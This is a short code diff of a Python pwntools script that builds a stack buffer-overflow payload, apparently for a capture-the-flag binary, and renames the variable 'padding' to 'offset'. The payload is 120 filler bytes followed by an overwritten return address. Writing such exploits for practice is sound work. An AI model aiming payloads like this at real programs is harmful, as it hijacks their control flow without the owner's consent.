@@ -2,10 +2,10 @@ import argparse
 from pwn import *
 import struct;
 
-padding = b"A"*120
+offset = b"A"*120
 rip = b"\xc9\x11@\x00\x00\x00\x00\x00\x00"
 
-payload = b"".join([padding,rip]) 
+payload = b"".join([offset,rip]) 
 
 parser = argparse.ArgumentParser()
 parser.add_argument(
